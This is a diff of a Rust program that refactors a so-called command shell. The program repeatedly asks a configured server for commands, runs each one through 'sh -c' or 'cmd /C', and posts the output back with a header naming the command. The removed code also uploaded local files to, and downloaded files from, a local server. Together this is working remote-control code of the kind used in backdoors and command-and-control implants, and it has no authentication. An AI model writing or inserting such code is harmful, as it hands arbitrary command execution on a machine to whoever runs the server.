@@ -3,6 +3,8 @@ use std::process::Command;
 use std::env;
 use std::fs;
 use std::path::Path;
+use crate::config::ServerConfig;
+use reqwest;
 
 async fn execute_and_capture(cmd: &str, args: &[&str]) -> io::Result<String> {
     let output = Command::new(cmd)
@@ -40,7 +42,8 @@ fn display_tree(path: &Path, prefix: &str, is_last: bool) -> io::Result<()> {
     Ok(())
 }
 
-async fn execute_command(parts: &[&str]) -> io::Result<String> {
+async fn execute_command(cmd: &str) -> io::Result<String> {
+    let parts: Vec<&str> = cmd.split_whitespace().collect();
     match parts[0] {
         "cd" => {
             let path = parts.get(1).map(|s| *s).unwrap_or(".");
@@ -50,59 +53,15 @@ async fn execute_command(parts: &[&str]) -> io::Result<String> {
                 Err(e) => Ok(format!("Error: {}", e))
             }
         },
-        "pwd" => {
-            Ok(format!("Current directory: {}", env::current_dir()?.display()))
-        },
-        "upload" => {
-            let filename = parts.get(1)
-                .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "Missing filename"))?;
-            
-            // Read file
-            let content = fs::read(filename)?;
-            
-            // Upload file
-            match ureq::post("http://127.0.0.1:8080/upload")
-                .set("X-Filename", Path::new(filename).file_name()
-                    .and_then(|n| n.to_str())
-                    .unwrap_or(filename))
-                .send_bytes(&content) {
-                Ok(_) => Ok(format!("Successfully uploaded {}", filename)),
-                Err(e) => Ok(format!("Failed to upload {}: {}", filename, e))
-            }
-        },
-        "download" => {
-            let filename = parts.get(1)
-                .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "Missing filename"))?;
-            
-            // Download file
-            match ureq::get(&format!("http://127.0.0.1:8080/download/{}", filename))
-                .call() {
-                Ok(response) => {
-                    let bytes: Vec<u8> = response.into_reader()
-                        .bytes()
-                        .filter_map(|b| b.ok())
-                        .collect();
-                    
-                    let size = bytes.len();
-                    fs::write(filename, bytes)?;
-                    Ok(format!("Successfully downloaded {} ({} bytes)", filename, size))
-                },
-                Err(e) => Ok(format!("Failed to download {}: {}", filename, e))
-            }
-        },
-        "help" => {
-            Ok(format!("Available commands:\n\
-                cd (dir)        - Change directory\n\
-                pwd             - Print working directory\n\
-                tree            - Display directory tree\n\
-                upload (file)   - Upload file to server\n\
-                download (file) - Download file from server\n\
-                help            - Show this help\n\
-                (command)       - Execute system command"))
-        },
         cmd => {
-            let output = Command::new(cmd)
-                .args(&parts[1..])
+            let (program, args) = if cfg!(windows) {
+                ("cmd", vec!["/C", cmd])
+            } else {
+                ("sh", vec!["-c", cmd])
+            };
+
+            let output = Command::new(program)
+                .args(args)
                 .current_dir(env::current_dir()?)
                 .output()?;
 
@@ -119,43 +78,53 @@ fn stdin_ready() -> io::Result<bool> {
     Ok(stdin.read(&mut buf)? > 0)
 }
 
-// This is a simple command shell that allows for basic file operations and command execution.
-// It can change directories, upload and download files, and display a directory tree.
-// PRECONDITION: The server must be running and accessible at the specified address.
-// POSTCONDITION: The shell will exit when the user types 'exit'.
-pub async fn run_shell(server_addr: &str) -> io::Result<()> {
+pub async fn start_command_shell(config: ServerConfig) -> Result<(), Box<dyn std::error::Error>> {
     println!("Enhanced Command Shell started. Type 'help' for commands.");
 
-    // Initialize starting directory
-    let home_dir = dirs::home_dir()
-        .ok_or_else(|| io::Error::new(io::ErrorKind::Other, "Could not determine home directory"))?;
-    env::set_current_dir(&home_dir)?;
-
     loop {
-        // Check for commands from server
-        if let Ok(response) = ureq::get(&format!("http://{}/get_command", server_addr)).call() {
-            if response.status() == 200 {
-                let command = response.into_string()?;
-                println!("Received command: {}", command);
-                
-                let parts: Vec<&str> = command.split_whitespace().collect();
-                if !parts.is_empty() {
-                    let output = match execute_command(&parts).await {
-                        Ok(out) => out,
-                        Err(e) => format!("Error: {}", e),
-                    };
-
-                    // Send result back to server
-                    if let Err(e) = ureq::post(&format!("http://{}/submit_result", server_addr))
-                        .set("X-Command", &command)
-                        .send_string(&output) {
-                        eprintln!("Failed to send result: {}", e);
+        match get_next_command(&config).await {
+            Ok(Some(cmd)) => {
+                println!("Received command: {}", cmd);
+                match execute_command(&cmd).await {
+                    Ok(output) => {
+                        if let Err(e) = submit_result(&config, &cmd, &output).await {
+                            eprintln!("Failed to submit result: {}", e);
+                        }
                     }
+                    Err(e) => eprintln!("Error executing command: {}", e),
                 }
             }
+            Ok(None) => {
+                tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
+            }
+            Err(e) => {
+                eprintln!("Error getting command: {}", e);
+                tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
+            }
         }
-
-        // Small delay to prevent excessive polling
-        tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
     }
+}
+
+async fn get_next_command(config: &ServerConfig) -> Result<Option<String>, reqwest::Error> {
+    let client = reqwest::Client::new();
+    let resp = client.get(&config.get_command_url())
+        .send()
+        .await?;
+
+    if resp.status() == reqwest::StatusCode::NO_CONTENT {
+        return Ok(None);
+    }
+
+    Ok(Some(resp.text().await?))
+}
+
+async fn submit_result(config: &ServerConfig, cmd: &str, output: &str) -> Result<(), reqwest::Error> {
+    let client = reqwest::Client::new();
+    client.post(&config.submit_result_url())
+        .header("X-Command", cmd)
+        .body(output.to_string())
+        .send()
+        .await?;
+    
+    Ok(())
 }
